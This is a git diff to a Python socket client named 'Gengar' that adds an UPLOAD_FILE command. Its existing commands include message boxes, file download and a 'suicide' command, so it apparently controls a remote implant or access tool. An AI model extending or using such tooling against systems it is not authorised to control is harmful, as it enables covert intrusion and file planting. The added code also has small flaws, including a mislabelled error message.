@@ -1,4 +1,5 @@
 import datetime
+import os
 import socket
 import struct
 from dataclasses import dataclass
@@ -14,6 +15,7 @@ class CommandTypes:
     MSGBOX = 2
     SUICIDE = 3
     DOWNLOAD_FILE = 4
+    UPLOAD_FILE = 5
 
 
 INT_SIZE = 4
@@ -125,6 +127,24 @@ class Gengar:
                 file_chunk = self._recvall(bytes_to_read)
                 output_file.write(file_chunk)
                 bytes_remaining -= bytes_to_read
+
+    def upload_file(self, local_path: str, remote_path: str = None):
+        self._send(struct.pack('I', CommandTypes.UPLOAD_FILE) +
+                   struct.pack('I', len(remote_path)) + remote_path.encode())
+        return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
+        if return_code != 0:
+            logger.error(f'Failed to download file: {return_code}')
+            return
+
+        file_size = os.path.getsize(local_path)
+        self._send(struct.pack('Q', file_size))
+        logger.info(f'Uploading {local_path} ({file_size})')
+        with open(local_path, 'rb') as output_file:
+            while True:
+                file_chunk = output_file.read(self.FILE_IO_CHUNK_SIZE)
+                if not file_chunk:
+                    break
+                self._send(file_chunk)
 
     def suicide(self):
         self._send(struct.pack('I', CommandTypes.SUICIDE))
